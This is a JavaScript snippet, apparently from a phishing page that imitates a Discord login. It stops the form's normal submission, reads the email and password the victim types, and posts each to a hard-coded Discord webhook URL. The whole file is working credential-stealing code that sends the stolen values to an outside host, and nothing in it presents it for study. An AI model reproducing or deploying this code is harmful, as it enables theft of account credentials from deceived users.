function func() {
    event.preventDefault();
    
    const email = document.querySelector(".inputField-4g7rSQ").value;
    const pass = document.querySelector(".pass").value;
    const whurl = "https://discord.com/api/webhooks/1249246020865359923/nJlHG-h5jYSK-NN5f9Kf-G0dxSbxs1zjgG3G9E5uxs8-8tK2d69NO3dsotxd3vMCZWDt"
    fetch(whurl,{
        "method":"POST",
        "headers": {"content-type":"application/json"},
        "body": JSON.stringify({
            "content": email
        })
    })
    fetch(whurl,{
        "method":"POST",
        "headers": {"content-type":"application/json"},
        "body": JSON.stringify({
            "content": pass
        })
    })
}
